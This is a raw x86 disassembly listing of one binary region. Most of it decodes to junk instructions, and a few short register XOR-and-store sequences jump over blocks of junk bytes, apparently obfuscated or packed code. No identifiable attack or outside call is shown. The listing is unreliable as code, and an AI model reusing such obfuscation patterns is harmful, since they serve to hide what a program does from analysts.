  401979:	icebp  
  40197a:	xor    edx,DWORD PTR [ebx-0xb]
  40197d:	imul   edx,ebp,0x74
  401980:	fdivrp st(5),st
  401982:	cmp    ebp,DWORD PTR [edx]
  401984:	cmp    ecx,eax
  401986:	vpmacsdql xmm8,xmm2,XMMWORD PTR [ecx],xmm2
  40198c:	add    al,0xfa
  40198e:	mov    esi,0x2cddb633
  401993:	xchg   ecx,eax
  401994:	icebp  
  401995:	fwait
  401996:	adc    esp,esp
  401998:	retf   
  401999:	cld    
  40199a:	push   0x3d3bc043
  40199f:	pop    edi
  4019a0:	push   0x94bd8990
  4019a5:	data16 and al,0x6d
  4019a8:	leave  
  4019a9:	sbb    edx,DWORD PTR [eax+0x3cf0782]
  4019af:	not    al
  4019b1:	and    ah,BYTE PTR [edi+edx*4+0x5ecc772c]
  4019b8:	mov    dl,0x1c
  4019ba:	jg     0x401a04
  4019bc:	mov    ds:0x892289b8,al
  4019c1:	popf   
  4019c2:	clc    
  4019c3:	(bad)  
  4019c4:	jmp    0x4019eb
  4019c6:	inc    eax
  4019c7:	xor    ch,BYTE PTR [esi+eiz*2]
  4019ca:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  4019cb:	ret    
  4019cc:	repnz pop ebp
  4019ce:	pop    edx
  4019cf:	xor    eax,0xfc65a5a6
  4019d4:	and    bl,al
  4019d6:	addr16 in al,dx
  4019d8:	and    esp,DWORD PTR [ecx+0x37]
  4019db:	je     0x4019c6
  4019dd:	and    DWORD PTR fs:[edx-0x1d],ebx
  4019e1:	dec    esi
  4019e2:	adc    ch,BYTE PTR [edi]
  4019e4:	push   cs
  4019e5:	xchg   DWORD PTR [ecx-0x69],eax
  4019e8:	dec    ecx
  4019e9:	xor    ecx,DWORD PTR ds:0x72ad6fac
  4019ef:	mov    bl,0x12
  4019f1:	mov    ebx,0x9f6b56c9
  4019f6:	stc    
  4019f7:	xor    eax,0x7f638675
  4019fc:	xchg   ebp,eax
  4019fd:	and    al,0x4d
  4019ff:	pop    ebx
  401a00:	adc    al,0x2
  401a02:	pop    edx
  401a03:	xlat   BYTE PTR ds:[ebx]
  401a04:	add    al,0xa
  401a06:	das    
  401a07:	jge    0x4019d3
  401a09:	inc    esp
  401a0a:	hlt    
  401a0b:	scas   al,BYTE PTR es:[edi]
  401a0c:	(bad)  
  401a0d:	sar    DWORD PTR ds:0xa6965884,0xde
  401a14:	rcl    BYTE PTR [ecx],0xbb
  401a17:	aas    
  401a18:	outs   dx,BYTE PTR ds:[esi]
  401a19:	fs jo  0x401a64
  401a1c:	inc    eax
  401a1d:	xlat   BYTE PTR ds:[ebx]
  401a1e:	inc    esi
  401a1f:	push   esp
  401a20:	and    al,0x7c
  401a22:	xor    eax,0xae50e6c0
  401a27:	inc    edi
  401a28:	out    dx,eax
  401a29:	mov    cx,0xfd48
  401a2d:	div    BYTE PTR [ebp+eiz*8+0x3ea89ef9]
  401a34:	ss int 0x24
  401a37:	dec    ebp
  401a38:	sbb    cl,dh
  401a3a:	repz inc ebp
  401a3c:	xchg   esi,eax
  401a3d:	jl     0x401a24
  401a3f:	jns    0x4019f8
  401a41:	dec    ecx
  401a42:	mov    WORD PTR [edi],ds
  401a44:	fsub   st(5),st
  401a46:	push   eax
  401a47:	gs or  eax,0xd6c90403
  401a4d:	push   0xe6251730
  401a52:	pushf  
  401a53:	repnz xchg edx,eax
  401a55:	das    
  401a56:	add    eax,0x916b9c1a
  401a5b:	adc    eax,0x7b3cb219
  401a60:	and    al,0x39
  401a62:	and    DWORD PTR ds:0x47d41da6,eax
  401a68:	pop    ss
  401a69:	push   esi
  401a6a:	push   0x3a
  401a6c:	jg     0x401aaf
  401a6e:	jl     0x401ac8
  401a70:	or     edi,DWORD PTR [esi-0x1a]
  401a73:	and    BYTE PTR [edi],bl
  401a75:	push   ds
  401a76:	sub    DWORD PTR [ecx-0x63164fa3],ecx
  401a7c:	add    DWORD PTR [eax],eax
  401a7e:	add    BYTE PTR [ecx-0x4c264c60],dl
  401a84:	jmp    0x10588ada
  401a89:	push   ds
  401a8a:	dec    esp
  401a8b:	and    DWORD PTR [ecx+esi*8],ecx
  401a8e:	fs push cs
  401a90:	js     0x401b10
  401a92:	jle    0x401a8e
  401a94:	jg     0x401b14
  401a96:	jle    0x401ac3
  401a98:	push   edx
  401a99:	push   0x57
  401a9b:	and    BYTE PTR [eax+0x3d7b6d33],dh
  401aa1:	arpl   WORD PTR [edx-0x3f],di
  401aa4:	das    
  401aa5:	sbb    eax,0x4fc6e2e0
  401aaa:	icebp  
  401aab:	jle    0x401b12
  401aad:	cld    
  401aae:	inc    eax
  401aaf:	(bad)  
  401ab0:	mov    ecx,eax
  401ab2:	sbb    al,0xbd
  401ab4:	dec    edx
  401ab5:	mov    ah,0xf7
  401ab7:	iret   
  401ab8:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  401ab9:	cmp    BYTE PTR [ebp+0x232bdedd],dh
  401abf:	mov    WORD PTR [ecx+0x2b98979],gs
  401ac5:	rep outs dx,BYTE PTR ds:[esi]
  401ac7:	(bad)
  401acb:	pop    edi
  401acc:	xchg   ebx,eax
  401acd:	imul   esi,eax,0xb
  401ad0:	pop    ss
  401ad1:	imul   ebx,DWORD PTR [esi+0x43ed17be],0xffffffb8
  401ad8:	sub    al,0x89
  401ada:	push   edx
  401adb:	mov    BYTE PTR [edi+0x7c643867],bl
  401ae1:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  401ae2:	xor    al,0xb0
  401ae4:	fistp  WORD PTR [ebp-0x53]
  401ae7:	ret    
  401ae8:	push   0x19ff2794
  401aed:	cld    
  401aee:	push   0x5db39160
  401af3:	inc    ebx
  401af4:	popa   
  401af5:	jo     0x401b16
  401af7:	sti    
  401af8:	mov    ds:0xd1d86fe7,eax
  401afd:	rcl    BYTE PTR [ecx+0xe9ce095],1
  401b03:	neg    BYTE PTR [eax*4-0x637cb719]
  401b0a:	mov    DWORD PTR [eax],esi
  401b0c:	add    DWORD PTR [edi],ebx
  401b0e:	ror    edx,0x88
  401b11:	clc    
  401b12:	jmp    0xdec8:0x6580c0f3
  401b19:	mov    ebp,0x227e8c84
  401b1e:	pop    eax
  401b1f:	inc    edi
  401b20:	dec    edx
  401b21:	cmp    DWORD PTR [ebp-0x21],esp
  401b24:	mov    dh,0x68
  401b26:	sub    eax,0x30693708
  401b2b:	push   ecx
  401b2c:	jl     0x401b2f
  401b2e:	shr    ch,0xcb
  401b31:	cld    
  401b32:	push   0x57
  401b34:	xchg   ebp,eax
  401b35:	fcomp  st(0)
  401b37:	dec    esi
  401b38:	add    DWORD PTR [esi],eax
  401b3a:	je     0x401b73
  401b3c:	mov    WORD PTR [ecx],gs
  401b3e:	aam    0x85
  401b40:	xor    al,0x46
  401b42:	ja     0x401bba
  401b44:	ror    BYTE PTR [edx-0x42b7a2cc],cl
  401b4a:	fs nop
  401b4c:	scas   eax,DWORD PTR es:[edi]
  401b4d:	xchg   esi,eax
  401b4e:	(bad)  
  401b4f:	std    
  401b50:	imul   eax
  401b52:	rcl    DWORD PTR [edi],cl
  401b54:	(bad)  
  401b56:	push   edx
  401b57:	stc    
  401b58:	pop    edx
  401b59:	sub    DWORD PTR es:[eax],edi
  401b5c:	cld    
  401b5d:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  401b5e:	stos   BYTE PTR es:[edi],al
  401b5f:	fs push 0xfb834bce
  401b65:	mov    BYTE PTR [ecx+0x90f479a],ch
  401b6b:	test   eax,0x8f1a0719
  401b71:	aam    0x60
  401b73:	dec    ebp
  401b74:	mov    ss,WORD PTR [ecx]
  401b76:	stos   DWORD PTR es:[edi],eax
  401b77:	test   DWORD PTR [edx],edi
  401b79:	popf   
  401b7a:	or     ebx,DWORD PTR [esi]
  401b7c:	jne    0x401b8a
  401b7e:	add    eax,DWORD PTR [eax+edi*1+0x6e]
  401b82:	xchg   ebp,eax
  401b83:	enter  0x30a5,0x18
  401b87:	cmp    dh,dl
  401b89:	fild   WORD PTR [esi]
  401b8b:	cmp    ch,BYTE PTR [ebp-0x688950d2]
  401b91:	inc    edx
  401b92:	repnz in al,0xcb
  401b95:	in     eax,0x2f
  401b97:	ja     0x401b4b
  401b99:	aad    0x45
  401b9b:	fnstenv [ebp+0x3a]
  401b9e:	pusha  
  401b9f:	je     0x401b6e
  401ba1:	xchg   ebx,eax
  401ba2:	pmuludq mm1,mm3
  401ba5:	and    BYTE PTR ds:0x7ea21f4e,dh
  401bab:	push   esi
  401bac:	mov    ebp,0xbbe2a663
  401bb1:	add    cl,ch
  401bb3:	or     al,0xd3
  401bb5:	fnstenv [ecx+0x6d]
  401bb8:	adc    cl,bh
  401bba:	repz lea ebp,[eax]
  401bbd:	sub    ebp,DWORD PTR ds:0xe957fc98
  401bc3:	add    eax,0x41e90692
  401bc8:	fucomip st,st(7)
  401bca:	clc    
  401bcb:	pop    ebx
  401bcc:	scas   eax,DWORD PTR es:[edi]
  401bcd:	fcomp  DWORD PTR [edi+eax*8-0x5]
  401bd1:	dec    esi
  401bd2:	push   edx
  401bd3:	mov    WORD PTR [eax-0x62],?
  401bd6:	je     0x401bf0
  401bd8:	je     0x401c2a
  401bda:	icebp  
  401bdb:	cmp    ch,bh
  401bdd:	fld    DWORD PTR [eax-0x2dd1fe5b]
  401be3:	jg     0x401c0e
  401be5:	cmp    bh,BYTE PTR [ebp+0x41]
  401be8:	leave  
  401be9:	add    BYTE PTR [ebx+0x4d],ah
  401bec:	jl     0x401c4b
  401bee:	out    0xe2,al
  401bf0:	ret    0xc8af
  401bf3:	iret   
  401bf4:	or     BYTE PTR [ebx+edi*2-0x74ac3630],bh
  401bfb:	sub    ebx,DWORD PTR ds:0x77273af7
  401c01:	sub    al,BYTE PTR cs:[edx+0x1e9bfa2e]
  401c08:	inc    ebx
  401c09:	pcmpgtw mm3,mm3
  401c0c:	inc    edx
  401c0d:	mov    ds:0xee714fa3,eax
  401c12:	clc    
  401c13:	outs   dx,DWORD PTR ds:[esi]
  401c14:	neg    DWORD PTR [edx-0x3dc8e31d]
  401c1a:	pop    ebx
  401c1b:	mov    eax,DWORD PTR [ebp-0x50]
  401c1e:	mov    ecx,DWORD PTR [ebp-0x8]
  401c21:	xor    eax,esi
  401c23:	add    eax,edi
  401c25:	mov    DWORD PTR [ecx],eax
  401c27:	mov    eax,DWORD PTR [ebp-0x24]
  401c2a:	mov    ecx,DWORD PTR [ebp-0x8]
  401c2d:	xor    eax,esi
  401c2f:	jmp    0x401dd0
  401c34:	pop    ss
  401c35:	xor    eax,DWORD PTR [ebx]
  401c37:	mov    dl,0x23
  401c39:	mov    dl,0xb7
  401c3b:	mov    bl,0xfb
  401c3d:	lahf   
  401c3e:	cmc    
  401c3f:	xchg   esp,eax
  401c40:	adc    BYTE PTR [ecx+0x798afc5f],dh
  401c46:	jle    0x401cc6
  401c48:	cli    
  401c49:	jg     0x401cc9
  401c4b:	jle    0x401c4b
  401c4d:	mov    ebx,0xce07100e
  401c52:	test   al,0xe6
  401c54:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  401c55:	sbb    ch,bl
  401c57:	push   eax
  401c58:	enter  0x3a16,0x32
  401c5c:	xchg   edi,eax
  401c5d:	cli    
  401c5e:	mov    dh,0x24
  401c60:	xor    esi,esp
  401c62:	fidiv  DWORD PTR [ecx]
  401c64:	cmp    BYTE PTR [ebx],0x57
  401c67:	inc    ebx
  401c68:	add    al,0x2d
  401c6a:	pop    ss
  401c6b:	xor    eax,0x369dffe7
  401c70:	jl     0x401cef
  401c72:	(bad)  
  401c73:	(bad)  
  401c74:	jmp    0xe1ecb3cc
  401c79:	inc    esi
  401c7a:	cmp    al,0x13
  401c7c:	mov    ebp,0xfee16208
  401c81:	je     0x401c78
  401c83:	add    dl,BYTE PTR [esi+0x674c1516]
  401c89:	jp     0x401cf5
  401c8b:	or     al,0x4d
  401c8d:	scas   al,BYTE PTR es:[edi]
  401c8e:	call   0x4d4e31d8
  401c93:	ds ins BYTE PTR es:[edi],dx
  401c95:	loopne 0x401cb8
  401c97:	push   ss
  401c98:	adc    DWORD PTR [edx],esp
  401c9a:	sub    eax,0xade274df
  401c9f:	jo     0x401c82
  401ca1:	xchg   edx,eax
  401ca2:	arpl   WORD PTR [esp+ecx*4-0x75],dx
  401ca6:	ja     0x401c50
  401ca8:	popf   
  401ca9:	add    eax,0x7ce81e41
  401cae:	xor    ebp,DWORD PTR [eax-0x2847efda]
  401cb4:	mov    cs,WORD PTR [eax-0x69]
  401cb7:	imul   esi,edi,0x854975fb
  401cbd:	sub    esp,DWORD PTR [ebx+0x6b]
  401cc0:	ja     0x401ccf
  401cc2:	mov    ds:0x8e3b873e,al
  401cc7:	cmp    eax,0x1baa638a
  401ccc:	add    bl,BYTE PTR [ebx-0x1a]
  401ccf:	and    eax,0x9ebb4dc8
  401cd4:	stc    
  401cd5:	sbb    ecx,ecx
  401cd7:	adc    BYTE PTR [ebx+ebx*1+0x3bb0af8e],al
  401cde:	xchg   ebp,eax
  401cdf:	xor    dl,dh
  401ce1:	mov    dh,0x50
  401ce3:	push   edi
  401ce4:	or     bh,BYTE PTR [ecx+0x2b023cab]
  401cea:	mov    dl,0x42
  401cec:	dec    ecx
  401ced:	add    DWORD PTR [ecx-0x2c5cbf9d],esi
  401cf3:	dec    edi
  401cf4:	mov    esi,0xb1deb169
  401cf9:	mov    dh,0x87
  401cfb:	mov    dh,0x55
  401cfd:	shl    BYTE PTR [edx+0x7d],0x97
  401d01:	push   ebp
  401d02:	hlt    
  401d03:	out    dx,al
  401d04:	jle    0x401d35
  401d06:	mov    eax,0x8e44995
  401d0b:	test   edi,edx
  401d0d:	pop    ebp
  401d0e:	mov    ah,0xe1
  401d10:	add    esp,edx
  401d12:	mov    dh,0xe2
  401d14:	pop    ebx
  401d15:	jae    0x401d72
  401d17:	jns    0x401cb7
  401d19:	adc    eax,0x65850ebc
  401d1e:	jg     0x401d0d
  401d20:	scas   eax,DWORD PTR es:[edi]
  401d21:	lods   eax,DWORD PTR ds:[esi]
  401d22:	mov    dh,BYTE PTR [ecx]
  401d24:	into   
  401d25:	sub    BYTE PTR [ebp+edx*8+0x4ac7263b],dl
  401d2c:	xchg   DWORD PTR [eax+0x18],ebp
  401d2f:	cmp    eax,0x15b4d7f0
  401d34:	mov    ah,0x63
  401d36:	jbe    0x401d3b
  401d38:	loopne 0x401d8f
  401d3a:	push   0xffffff8c
  401d3c:	arpl   WORD PTR [edx+esi*2+0x2c],bp
  401d40:	in     eax,dx
  401d41:	inc    ebp
  401d43:	mov    ch,0xc5
  401d45:	out    0xde,al
  401d47:	jp     0x401cd6
  401d49:	pop    ebx
  401d4a:	out    0x21,al
  401d4c:	jecxz  0x401da5
  401d4e:	jg     0x401d2e
  401d50:	dec    esp
  401d51:	scas   al,BYTE PTR es:[edi]
  401d52:	or     ch,dl
  401d54:	xor    DWORD PTR ds:0xb52b793,0xd5005007
  401d5e:	sub    dh,BYTE PTR [edx]
  401d60:	inc    esi
  401d61:	loop   0x401d94
  401d63:	(bad)  [ecx+0x5128a21c]
  401d69:	dec    esi
  401d6a:	jnp    0x401d61
  401d6c:	pop    esi
  401d6d:	pop    es
  401d6e:	outs   dx,BYTE PTR ds:[esi]
  401d6f:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  401d70:	xchg   esp,eax
  401d71:	sbb    BYTE PTR [ebp+0xa],cl
  401d74:	sub    BYTE PTR [edi+ecx*2],ch
  401d77:	mov    eax,0x86c13df2
  401d7c:	or     DWORD PTR [edi],ebx
  401d7e:	push   edi
  401d7f:	fidiv  DWORD PTR [ecx]
  401d81:	test   DWORD PTR [edi+0x5e],ecx
  401d84:	cwde   
  401d85:	pop    eax
  401d86:	sub    eax,0x4e1a0aa2
  401d8b:	or     eax,0x5899b86c
  401d90:	push   esp
  401d91:	fisttp DWORD PTR [edi+0x34]
  401d94:	iret   
  401d95:	stos   BYTE PTR es:[edi],al
  401d96:	sub    bl,al
  401d98:	pushf  
  401d99:	adc    eax,0x2b17d22b
  401d9e:	xchg   BYTE PTR [eax+0x7215e948],ch
  401da4:	(bad)  
  401da5:	aaa    
  401da6:	or     bl,BYTE PTR [ecx]
  401da8:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  401da9:	in     al,dx
  401daa:	mul    DWORD PTR [esi]
  401dac:	push   esp
  401dad:	push   cs
  401dae:	call   0xdd26cbdd
  401db3:	nop
  401db4:	retf   0xe4fe
  401db7:	(bad)  
  401db8:	mov    ch,dh
  401dba:	into   
  401dbb:	and    edi,ebp
  401dbd:	retf   
  401dbe:	test   BYTE PTR [esi+eax*2],dl
  401dc1:	jns    0x401dae
  401dc3:	clc    
  401dc4:	nop
  401dc5:	je     0x401e29
  401dc7:	sub    eax,0x5dccf929
  401dcc:	xor    dl,BYTE PTR [edi]
  401dce:	lock push es
  401dd0:	add    eax,edi
  401dd2:	mov    DWORD PTR [ecx+0x4],eax
  401dd5:	mov    eax,DWORD PTR [ebp-0x2c]
  401dd8:	mov    ecx,DWORD PTR [ebp-0x8]
  401ddb:	mov    DWORD PTR [ecx+0x8],eax
  401dde:	mov    eax,DWORD PTR [ebp-0x30]
  401de1:	mov    ecx,DWORD PTR [ebp-0x8]
  401de4:	mov    DWORD PTR [ecx+0xc],eax
  401de7:	mov    eax,DWORD PTR [ebp-0x34]
  401dea:	mov    ecx,DWORD PTR [ebp-0x8]
  401ded:	mov    DWORD PTR [ecx+0x10],eax
  401df0:	mov    eax,eax
  401df2:	mov    eax,DWORD PTR [ebp-0x20]
  401df5:	xor    eax,esi
  401df7:	add    eax,edi
  401df9:	jmp    0x401f9a
  401dfe:	mov    ah,0x22
  401e00:	les    eax,FWORD PTR [eax+edx*2]
  401e03:	loopne 0x401e79
  401e05:	mov    dl,0xc7
  401e07:	xor    DWORD PTR [eax+0x5b3bdd38],ebp
  401e0d:	and    edx,DWORD PTR [esi]
  401e0f:	pop    es
  401e10:	jle    0x401e90
  401e12:	cli    
  401e13:	jg     0x401e93
  401e15:	jle    0x401e65
  401e17:	push   cs
  401e18:	cmp    eax,0x8ae052b3
  401e1d:	int3   
  401e1e:	add    al,0xb3
  401e20:	fist   DWORD PTR [edi-0x42052ec8]
  401e26:	inc    esp
  401e27:	jmp    FWORD PTR [eax-0x78]
  401e2a:	jp     0x401e26
  401e2c:	inc    ebp
  401e2d:	and    DWORD PTR [esp+edi*1-0x444423de],edx
  401e34:	(bad)  
  401e35:	(bad)  
  401e36:	outs   dx,BYTE PTR ds:[esi]
  401e37:	xchg   esi,eax
  401e38:	in     al,0x1f
  401e3a:	push   edi
  401e3b:	int    0xa5
  401e3d:	aad    0xb8
  401e3f:	test   al,0xa0
  401e41:	ror    ch,1
  401e43:	jl     0x401de8
  401e45:	xchg   BYTE PTR [edi-0x4235b835],ah
  401e4b:	shl    DWORD PTR [ebp+0x792aa3c4],cl
  401e51:	bnd jae 0x401e7d
  401e54:	leave  
  401e55:	out    0xc1,eax
  401e57:	inc    eax
  401e58:	ss dec ebp
  401e5a:	and    eax,0x76d759f5
  401e5f:	aas    
  401e60:	movs   BYTE PTR es:[edi],BYTE PTR gs:[esi]
  401e62:	jb     0x401ea0
  401e64:	dec    ebp
  401e65:	xchg   ebp,eax
  401e66:	leave  
  401e67:	push   ss
  401e68:	outs   dx,DWORD PTR ds:[esi]
  401e69:	pop    esi
  401e6a:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  401e6b:	fnsave [ecx+edi*2]
  401e6e:	mov    ds:0x4cc3bb41,eax
  401e73:	clc    
  401e74:	inc    edx
  401e75:	fcom   DWORD PTR [ebx+0x1b]
  401e78:	push   eax
  401e79:	into   
  401e7a:	jge    0x401eb9
  401e7c:	xlat   BYTE PTR ds:[ebx]
  401e7d:	in     al,0xa6
  401e7f:	mov    cl,0xbf
  401e81:	(bad)  
  401e82:	repnz lods eax,DWORD PTR ds:[esi]
  401e84:	ins    DWORD PTR es:[edi],dx
  401e85:	pop    ebp
  401e86:	popf   
  401e87:	push   edx
  401e88:	sub    al,0xdb
  401e8a:	hlt    
  401e8b:	cli    
  401e8c:	xor    eax,0x4e1759e5
  401e91:	xor    al,0x16
  401e93:	retf   0xffaa
  401e96:	fsub   QWORD PTR [ebx-0x169a74]
  401e9c:	add    eax,0x22b6a932
  401ea1:	in     eax,dx
  401ea2:	(bad)  
  401ea3:	xchg   DWORD PTR [esi],ecx
  401ea5:	cmc    
  401ea6:	repz cmps DWORD PTR ds:[esi],DWORD PTR es:[edi]
  401ea8:	(bad)  
  401ea9:	sti    
  401eaa:	inc    esi
  401eab:	inc    eax
  401eac:	adc    eax,DWORD PTR [eax]
  401eae:	ret    0xddbd
  401eb1:	outs   dx,DWORD PTR ds:[esi]
  401eb2:	mov    ebp,0x26fcd2b4
  401eb7:	rcr    DWORD PTR [esi],0x69
  401eba:	sar    esi,cl
  401ebc:	into   
  401ebd:	jge    0x401e70
  401ebf:	mov    dh,0xdc
  401ec1:	je     0x401ef8
  401ec3:	xchg   BYTE PTR [ecx-0x34139078],ah
  401ec9:	ror    DWORD PTR [edx],0x94
  401ecc:	mov    BYTE PTR [ecx],bh
  401ece:	mov    ah,0x86
  401ed0:	pop    es
  401ed1:	and    al,0x4f
  401ed3:	enter  0x9691,0x3
  401ed7:	push   ebp
  401ed8:	fisttp WORD PTR [edx+edx*1+0x11]
  401edc:	outs   dx,BYTE PTR ds:[esi]
  401edd:	jo     0x401f54
  401edf:	add    BYTE PTR [edx],dh
  401ee1:	ror    BYTE PTR [esi+0x6eeb6597],1
  401ee7:	cmc    
  401ee8:	sbb    eax,0xa4bb95d3
  401eed:	jne    0x401ec4
  401eef:	(bad)  
  401ef1:	add    al,0xa4
  401ef3:	jnp    0x401ec9
  401ef5:	inc    esp
  401ef6:	mov    eax,ds:0x4f636a15
  401efb:	aas    
  401efc:	sbb    al,0xdb
  401efe:	add    eax,0x7f4d4ca3
  401f03:	sti    
  401f04:	loopne 0x401f85
  401f06:	sbb    ch,ch
  401f08:	adc    al,0x3a
  401f0a:	sub    bl,BYTE PTR [ecx+0x55]
  401f0d:	push   edx
  401f0e:	push   esp
  401f0f:	nop
  401f10:	mov    DWORD PTR [edx],esi
  401f12:	cmc    
  401f13:	sti    
  401f14:	or     eax,esp
  401f16:	mov    ds:0xecb498b3,eax
  401f1b:	cs sahf 
  401f1d:	xchg   DWORD PTR [eax],edi
  401f1f:	stos   BYTE PTR es:[edi],al
  401f20:	cmp    ch,dh
  401f22:	repz rcr DWORD PTR [eax-0x58e503bc],cl
  401f29:	pop    ds
  401f2a:	adc    eax,0xd9497b2b
  401f2f:	jmp    0xf1d6:0x2ce95a8f
  401f36:	sub    eax,0xa995b991
  401f3b:	sbb    eax,0xc351e10
  401f40:	retf   
  401f41:	xchg   BYTE PTR ds:0x92641850,bh
  401f47:	cmp    eax,0x50a25aef
  401f4c:	lea    edx,[edx+0x4ec20703]
  401f52:	sbb    DWORD PTR [ecx+ebx*4+0x5c],esp
  401f56:	test   al,0x4b
  401f58:	sahf   
  401f59:	int3   
  401f5a:	test   BYTE PTR [ebp-0xd893ef0],0xd5
  401f61:	lods   al,BYTE PTR ds:[esi]
  401f62:	push   edx
  401f64:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  401f65:	mov    edi,0x2c09c857
  401f6a:	retf   
  401f6b:	gs (bad) 
  401f6d:	arpl   WORD PTR [ebx+0x1c],di
  401f70:	arpl   WORD PTR [edx-0x7a],bp
  401f73:	push   esp
  401f74:	test   BYTE PTR [eax-0x79360a22],ah
  401f7a:	pop    edx
  401f7b:	sar    DWORD PTR [ecx],0xdd
  401f7e:	jno    0x401f56
  401f80:	xchg   esi,eax
  401f81:	dec    eax
  401f82:	and    DWORD PTR [esi],ebp
  401f84:	fs ja  0x401fe4
  401f87:	pop    es
  401f88:	push   0xffffffe5
  401f8a:	shl    ebp,cl
  401f8c:	in     eax,dx
  401f8d:	test   dh,dl
  401f8f:	or     ebp,DWORD PTR [eax]
  401f91:	mov    BYTE PTR [ecx],cl
  401f93:	sub    ecx,DWORD PTR [ebx-0x675ec66d]
  401f99:	push   cs
  401f9a:	je     0x40230d
  401fa0:	lea    eax,[ebp-0x98]
  401fa6:	push   eax
  401fa7:	mov    eax,DWORD PTR [ebp-0x1c]
  401faa:	xor    eax,esi
  401fac:	add    eax,edi
  401fae:	jmp    0x40214f
  401fb3:	pop    ecx
  401fb4:	and    al,0xad
  401fb6:	aas    
  401fb7:	jno    0x402010
  401fb9:	imul   esp,DWORD PTR [eax-0x4769416e],0xa703c65e
  401fc3:	xchg   edx,eax
  401fc4:	add    al,0x7e
  401fc6:	jle    0x401fc2
  401fc8:	jg     0x402048
  401fca:	jle    0x40201b
  401fcc:	cmp    ax,0x6ff1
  401fd0:	xor    eax,esp
  401fd2:	(bad)  
  401fd3:	push   edx
  401fd4:	mov    BYTE PTR es:[esp+ecx*8],dh
  401fd8:	inc    bh
  401fda:	push   esi
  401fdb:	or     cl,BYTE PTR [edi]
  401fdd:	in     al,0x4
  401fdf:	faddp  st(1),st
  401fe1:	fnstsw WORD PTR [eax]
  401fe3:	lds    esp,FWORD PTR [eax]
  401fe5:	sbb    eax,DWORD PTR [ebx-0x41]
  401fe8:	iret   
  401fe9:	adc    eax,0xbe36e2ec
  401fee:	ins    BYTE PTR es:[edi],dx
  401fef:	(bad)  
  401ff0:	xor    eax,0x913dacea
  401ff5:	adc    BYTE PTR [ecx+0x10],al
  401ff8:	inc    eax
  401ff9:	fs push ebp
  401ffb:	lock add DWORD PTR [ecx+0x75],eax
  401fff:	aam    0x4b
  402001:	sub    ah,BYTE PTR ds:0x1b0bb739
  402007:	push   0xffffffa5
  402009:	in     al,0xf2
  40200b:	xchg   DWORD PTR [ebp+0xd28f848],edx
  402011:	sahf   
  402012:	jl     0x402083
  402014:	dec    edx
  402015:	jbe    0x401ff7
  402017:	and    DWORD PTR [esi+edi*4],esi
  40201a:	xor    DWORD PTR [ebx+0x49],edi
  40201d:	pop    es
  40201e:	jae    0x402060
  402020:	ja     0x40200c
  402022:	out    0x58,al
  402024:	ja     0x401fcd
  402026:	fdivr  QWORD PTR ds:0x9c3a6928
  40202c:	mov    ?,WORD PTR [esi+0x4f6c43cb]
  402032:	int    0xb6
  402034:	loopne 0x401fe8
  402036:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  402037:	mov    dl,0xef
  402039:	push   edi
  40203a:	loopne 0x401ff1
  40203c:	pop    di
  40203e:	and    al,BYTE PTR [edi+0x5d0aa65b]
  402044:	in     eax,dx
  402045:	and    al,bh
  402047:	sbb    DWORD PTR [ebp-0x4f440bd5],edx
  40204d:	push   ecx
  40204e:	pop    es
  40204f:	and    dh,BYTE PTR [ebp+0x1b]
  402052:	daa    
  402053:	nop
  402054:	aaa    
  402055:	pop    ebp
  402056:	cmp    al,0x75
  402058:	and    bl,BYTE PTR [esi+0x67]
  40205b:	jl     0x401fe4
  40205d:	(bad)  
  40205e:	cmp    bl,BYTE PTR [esp+esi*1+0x5b3b6193]
  402065:	dec    edx
  402066:	into   
  402067:	jg     0x40207d
  402069:	pushf  
  40206a:	lea    ecx,[ebx-0x32a13b4c]
  402070:	cmp    DWORD PTR [ebx-0x44],edi
  402073:	enter  0xfcda,0x8f
  402077:	jmp    edx
  402079:	push   edi
  40207a:	inc    edi
  40207b:	sbb    ebx,DWORD PTR [ecx-0x4c]
  40207e:	(bad)
  402081:	xchg   ch,cl
  402083:	mov    dl,0x7d
  402085:	loopne 0x4020ee
  402087:	sbb    DWORD PTR [esi*2-0x58380723],esp
  40208e:	mov    ds:0x67756dd2,al
  402093:	mov    dh,0xc4
  402095:	sbb    eax,0xd9814e82
  40209a:	fist   DWORD PTR ds:0x3a56c754
  4020a0:	test   al,0x25
  4020a2:	sbb    al,0xe2
  4020a4:	cdq    
  4020a5:	xor    bl,ah
  4020a7:	mov    esi,0x3e4b8b57
  4020ac:	(bad)  [eax]
  4020ae:	inc    ebx
  4020af:	fucomip st,st(2)
  4020b1:	fimul  DWORD PTR [edi-0x39779a9f]
  4020b7:	fcmovbe st,st(1)
  4020b9:	call   0x357232d4
  4020be:	pop    ebx
  4020bf:	pop    ebx
  4020c0:	or     DWORD PTR [ebp+0x53],0x24
  4020c4:	sbb    dh,cl
  4020c6:	mov    ds:0xe1172dde,eax
  4020cb:	cmp    ebp,DWORD PTR [eax+0x51]
  4020ce:	scas   al,BYTE PTR es:[edi]
  4020cf:	mov    dl,0x66
  4020d1:	mov    esi,0x199c0b2b
  4020d6:	shl    ah,1
  4020d8:	mov    ebx,0xdbbd4f58
  4020dd:	or     DWORD PTR [ebp-0x2],eax
  4020e0:	push   0xffffff89
  4020e2:	jecxz  0x40207e
  4020e4:	out    dx,al
  4020e5:	jmp    0x40211f
  4020e7:	stc    
  4020e8:	aad    0x99
  4020ea:	push   eax
  4020eb:	jmp    0x7ff8769f
  4020f0:	shl    DWORD PTR [esi+0x6141cddb],0xda
  4020f7:	pushf  
  4020f8:	jg     0x4020b1
  4020fa:	mov    dh,0xd9
  4020fc:	mov    ebx,0x34b72776
  402101:	push   ebx
  402102:	xor    BYTE PTR [esi*1+0x1b0c844d],bl
  402109:	faddp  st(3),st
  40210b:	nop
  40210c:	stos   BYTE PTR es:[edi],al
  40210d:	je     0x402170
  40210f:	clc    
  402110:	sub    dl,BYTE PTR [ecx-0x6c716c6d]
  402116:	inc    ebp
  402117:	(bad)  
  402118:	arpl   WORD PTR [edx-0x3bdbd50],ax
  40211e:	bnd callw 0xfca4
  402123:	sub    ch,BYTE PTR [ebp+0x7e]
  402126:	popa   
  402127:	cwde   
